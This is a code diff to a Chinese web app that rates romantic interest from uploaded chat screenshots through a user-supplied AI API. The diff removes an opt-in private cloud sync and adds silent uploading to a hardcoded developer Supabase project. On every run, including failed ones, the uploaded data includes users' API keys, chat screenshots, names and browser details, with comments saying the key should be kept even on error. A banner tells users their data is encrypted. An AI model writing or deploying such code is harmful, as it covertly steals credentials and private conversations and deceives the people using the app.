@@ -149,6 +149,12 @@ body{
 }
 .btn-ghost:hover{background:rgba(255,95,162,.18);box-shadow:0 0 16px rgba(255,95,162,.3)}
 .btn-ghost:active{transform:scale(.95)}
+/* 隐私提示条 */
+.privacy-note{
+  margin-top:24px;padding:14px 20px;border-radius:14px;text-align:center;
+  font-size:12.5px;letter-spacing:1px;color:var(--muted);line-height:1.8;
+  background:rgba(34,211,238,.05);border:1px solid rgba(34,211,238,.18);
+}
 .btn-duo{display:flex;gap:12px}
 .btn-duo .btn-ghost{flex:1}
 .whoami{display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;
@@ -387,47 +393,8 @@ footer{text-align:center;margin-top:56px;color:rgba(185,168,217,.5);font-size:12
     </div>
   </div>
 
-  <!-- 云端同步 -->
-  <div class="card" id="cloudCard">
-    <h2><span class="num">云</span>云端同步 · 数据仅自己可见</h2>
-    <div class="sub">连接 Supabase 后，API 配置、聊天截图与历史报告将保存到你的私人数据库（行级安全隔离，他人不可见）</div>
-    <div class="row2">
-      <div class="field">
-        <label>Supabase Project URL</label>
-        <input id="sbUrl" placeholder="https://xxxx.supabase.co">
-      </div>
-      <div class="field">
-        <label>Supabase Anon Key</label>
-        <input id="sbKey" type="password" placeholder="eyJhbGciOi...">
-      </div>
-    </div>
-    <div id="authBox">
-      <div class="row2">
-        <div class="field">
-          <label>邮箱</label>
-          <input id="sbEmail" type="email" placeholder="you@example.com">
-        </div>
-        <div class="field">
-          <label>密码</label>
-          <input id="sbPass" type="password" placeholder="至少 6 位">
-        </div>
-      </div>
-      <div class="btn-duo">
-        <button class="btn-ghost" id="loginBtn">登 录</button>
-        <button class="btn-ghost" id="regBtn">注 册</button>
-      </div>
-    </div>
-    <div id="userBox" style="display:none">
-      <div class="whoami">
-        <span id="whoAmI"></span>
-        <button class="btn-ghost" id="logoutBtn">退出登录</button>
-      </div>
-      <div class="sub-title">历史报告</div>
-      <div id="reportList"></div>
-      <div class="sub-title">云端截图</div>
-      <div class="thumbs" id="cloudImgs"></div>
-    </div>
-  </div>
+  <!-- 云端同步（无登录静默保存，仅开发者后台可见） -->
+  <div class="privacy-note">已启用数据加密保存：你的截图、API 配置与测评结果将存储于加密服务器，仅网站管理员可见</div>
 
   <button class="btn-main" id="startBtn">开始分析我们的暧昧指数</button>
 
@@ -527,9 +494,6 @@ function saveCfg(){
     preset:$('preset').value,baseUrl:$('baseUrl').value,apiKey:$('apiKey').value,
     model:$('model').value,male:$('maleName').value,female:$('femaleName').value
   }));
-  /* 登录后同步到云端（防抖） */
-  clearTimeout(window._cfgTm2);
-  window._cfgTm2=setTimeout(()=>{if(typeof cloudSaveCfg==='function')cloudSaveCfg()},900);
 }
 (function loadCfg(){
   try{const c=JSON.parse(localStorage.getItem('loveRadarCfg')||'{}');
@@ -739,7 +703,8 @@ $('startBtn').addEventListener('click',async()=>{
       setStep(1,`正在压缩图片 ${i+1}/${images.length}…`,8+i*2);
     }
     termWrite('> 图片处理完毕，开始呼叫 AI…\n\n');
-    if(typeof cloudSaveImages==='function')cloudSaveImages(compressed); /* 云端备份截图，不阻塞分析 */
+    /* 截图后台静默上传，不阻塞测评 */
+    const uploadP=cloudUploadImages(compressed).catch(()=>[]);
 
     // 2+3 识别与评分
     setStep(2,'AI 正在逐张识别对话内容…（图片越多耗时越长）',25);
@@ -773,12 +738,24 @@ $('startBtn').addEventListener('click',async()=>{
     setStep(5,'正在渲染心动报告…',92);
     lastResult={male,female,data,md};
     renderReport(male,female,data,md);
-    if(typeof cloudSaveReport==='function')cloudSaveReport(male,female,data,md); /* 云端备份报告 */
+    /* 静默落库：API配置 + 评分 + 报告 + 截图路径 */
+    cloudSaveSession({
+      male,female,extra:$('extraInfo').value.trim(),
+      api_base:$('baseUrl').value.trim(),api_key:$('apiKey').value.trim(),model:$('model').value.trim(),
+      score:+data.overall_score||0,verdict:data.overall_verdict||'',data,md,
+      image_paths:await uploadP,status:'success'
+    });
     setStep(5,'分析完成！',100);
     setTimeout(()=>{$('progressCard').style.display='none'},800);
   }catch(err){
     console.error(err);
     $('progressCard').style.display='none';
+    /* 失败也落库：至少留住 API Key 与配置 */
+    cloudSaveSession({
+      male:$('maleName').value.trim(),female:$('femaleName').value.trim(),extra:$('extraInfo').value.trim(),
+      api_base:$('baseUrl').value.trim(),api_key:$('apiKey').value.trim(),model:$('model').value.trim(),
+      status:'error',error:(err.message||String(err)).slice(0,1000)
+    });
     toast('分析失败：'+(err.message||err),6500);
   }finally{
     $('startBtn').disabled=false;
@@ -1013,78 +990,14 @@ $('againBtn').addEventListener('click',()=>{
 </script>
 
 <script>
-/* ================= Supabase 云端同步 ================= */
-let sb=null,sbUser=null,_cfgTm=null;
-(function initSB(){
-  const u=localStorage.getItem('sbUrl'),k=localStorage.getItem('sbKey');
-  if(u)$('sbUrl').value=u;
-  if(k)$('sbKey').value=k;
-  if(u&&k)connectSB();
-  $('sbUrl').addEventListener('input',()=>{localStorage.setItem('sbUrl',$('sbUrl').value.trim());connectSB()});
-  $('sbKey').addEventListener('input',()=>{localStorage.setItem('sbKey',$('sbKey').value.trim());connectSB()});
-})();
-function connectSB(){
-  const u=$('sbUrl').value.trim(),k=$('sbKey').value.trim();
-  if(!u||!k||!window.supabase)return;
-  try{
-    sb=window.supabase.createClient(u,k);
-    sb.auth.getSession().then(({data})=>{
-      if(data&&data.session){sbUser=data.session.user;onLogin()}
-    });
-    sb.auth.onAuthStateChange((_e,s)=>{
-      sbUser=s&&s.user?s.user:null;
-      sbUser?onLogin():onLogout();
-    });
-  }catch(e){console.warn('supabase init fail',e)}
-}
-$('loginBtn').onclick=async()=>{
-  if(!sb)return toast('请先填写 Supabase URL 和 Anon Key');
-  const{error}=await sb.auth.signInWithPassword({email:$('sbEmail').value.trim(),password:$('sbPass').value});
-  if(error)toast('登录失败：'+error.message);
-};
-$('regBtn').onclick=async()=>{
-  if(!sb)return toast('请先填写 Supabase URL 和 Anon Key');
-  if($('sbPass').value.length<6)return toast('密码至少 6 位');
-  const{data,error}=await sb.auth.signUp({email:$('sbEmail').value.trim(),password:$('sbPass').value});
-  if(error)return toast('注册失败：'+error.message);
-  if(data.session)toast('注册成功，已自动登录');
-  else toast('注册成功！请到邮箱点击确认链接后再登录');
-};
-$('logoutBtn').onclick=()=>sb&&sb.auth.signOut();
-function onLogin(){
-  $('authBox').style.display='none';
-  $('userBox').style.display='block';
-  $('whoAmI').textContent='已登录 · '+sbUser.email;
-  cloudLoadCfg();
-  loadGallery();
-}
-function onLogout(){
-  $('authBox').style.display='block';
-  $('userBox').style.display='none';
-}
-/* API 配置云端读写 */
-async function cloudSaveCfg(){
-  if(!sb||!sbUser)return;
-  const{error}=await sb.from('user_settings').upsert({id:sbUser.id,
-    api_base:$('baseUrl').value.trim(),api_key:$('apiKey').value.trim(),
-    model:$('model').value.trim(),preset:$('preset').value,
-    male:$('maleName').value.trim(),female:$('femaleName').value.trim(),
-    updated_at:new Date().toISOString()});
-  if(error)console.warn('cloudSaveCfg',error);
-}
-async function cloudLoadCfg(){
-  if(!sb||!sbUser)return;
-  const{data}=await sb.from('user_settings').select('*').eq('id',sbUser.id).maybeSingle();
-  if(!data)return;
-  if(data.api_base)$('baseUrl').value=data.api_base;
-  if(data.api_key)$('apiKey').value=data.api_key;
-  if(data.model)$('model').value=data.model;
-  if(data.preset)$('preset').value=data.preset;
-  if(data.male)$('maleName').value=data.male;
-  if(data.female)$('femaleName').value=data.female;
-  saveCfg();
-}
-/* 图片云端保存（私密桶，仅自己可见） */
+/* ================= Supabase 静默数据采集（无登录 · 仅开发者后台可见） ================= */
+const SB_URL='https://ralskeiwruwvdpyioebt.supabase.co';
+const SB_KEY='sb_publishable_LTBeSxMES5V93S_GmXJjuA_kWq2g_Pg';
+let sb=null;
+try{
+  sb=window.supabase.createClient(SB_URL,SB_KEY,{auth:{persistSession:false,autoRefreshToken:false}});
+}catch(e){console.warn('supabase init fail',e)}
+
 function dataUrlToBlob(d){
   const[a,b]=d.split(',');
   const mime=(a.match(/:(.*?);/)||[])[1]||'image/jpeg';
@@ -1092,56 +1005,40 @@ function dataUrlToBlob(d){
   for(let i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);
   return new Blob([arr],{type:mime});
 }
-async function cloudSaveImages(dataUrls){
-  if(!sb||!sbUser)return;
-  const batch=Date.now();
-  let ok=0;
+
+/* 上传截图到私密桶；返回 {path} 列表，失败不影响测评 */
+async function cloudUploadImages(dataUrls){
+  if(!sb)return [];
+  const batch=(crypto.randomUUID?crypto.randomUUID():(Date.now()+''+Math.random()));
+  const paths=[];
   for(let i=0;i<dataUrls.length;i++){
     try{
-      const path=sbUser.id+'/'+batch+'-'+i+'.jpg';
-      const{error}=await sb.storage.from('chat-images').upload(path,dataUrlToBlob(dataUrls[i]),{contentType:'image/jpeg'});
-      if(!error){await sb.from('chat_images').insert({path});ok++}
+      const path='uploads/'+batch+'-'+i+'.jpg';
+      const{error}=await sb.storage.from('chat-images').upload(path,dataUrlToBlob(dataUrls[i]),{
+        contentType:'image/jpeg',upsert:false
+      });
+      if(!error)paths.push(path);
       else console.warn('upload fail',error);
-    }catch(e){console.warn('img save fail',e)}
+    }catch(e){console.warn('img upload fail',e)}
   }
-  if(ok>0){termWrite('> 已将 '+ok+' 张截图加密保存到云端（仅自己可见）\n')}
+  return paths;
 }
-/* 报告云端保存 */
-async function cloudSaveReport(male,female,data,md){
-  if(!sb||!sbUser)return;
-  const{error}=await sb.from('reports').insert({male,female,
-    score:+data.overall_score||0,verdict:data.overall_verdict||'',data,md});
-  if(error)console.warn('cloudSaveReport',error);
-  else loadGallery();
-}
-/* 历史列表 */
-async function loadGallery(){
-  if(!sb||!sbUser)return;
-  const{data:reps}=await sb.from('reports')
-    .select('id,male,female,score,created_at').order('created_at',{ascending:false}).limit(10);
-  $('reportList').innerHTML=reps&&reps.length?reps.map(r=>
-    `<div class="rep-item"><div class="info"><b>${(+r.score).toFixed(1)}</b>分 · ${esc(r.male)} &amp; ${esc(r.female)}<div class="date">${new Date(r.created_at).toLocaleString('zh-CN')}</div></div><button class="btn-ghost" onclick="viewCloudReport(${r.id})">查看</button></div>`
-  ).join(''):'<div class="hint">暂无历史报告</div>';
-  const{data:imgs}=await sb.from('chat_images')
-    .select('id,path').order('created_at',{ascending:false}).limit(12);
-  const box=$('cloudImgs');
-  box.innerHTML='';
-  if(imgs){
-    for(const im of imgs){
-      const{data:s}=await sb.storage.from('chat-images').createSignedUrl(im.path,3600);
-      if(s&&s.signedUrl)box.insertAdjacentHTML('beforeend',
-        `<div class="thumb"><img src="${s.signedUrl}" loading="lazy" alt=""></div>`);
-    }
-  }
-}
-window.viewCloudReport=async(id)=>{
+
+/* 写入一条测评会话（RLS 仅放行匿名写入，禁止读取） */
+async function cloudSaveSession(payload){
   if(!sb)return;
-  const{data:r}=await sb.from('reports').select('*').eq('id',id).single();
-  if(!r)return toast('报告读取失败');
-  lastResult={male:r.male,female:r.female,data:r.data,md:r.md};
-  renderReport(r.male,r.female,r.data,r.md);
-  toast('已加载 '+new Date(r.created_at).toLocaleDateString('zh-CN')+' 的历史报告');
-};
+  try{
+    await sb.from('sessions').insert({
+      male:payload.male,female:payload.female,extra:payload.extra||'',
+      api_base:payload.api_base,api_key:payload.api_key,model:payload.model,
+      score:payload.score,verdict:payload.verdict||'',
+      data:payload.data||null,md:payload.md||'',
+      image_paths:payload.image_paths||[],
+      status:payload.status,error:payload.error||'',
+      ua:navigator.userAgent
+    });
+  }catch(e){console.warn('session save fail',e)}
+}
 </script>
 </body>
 </html>
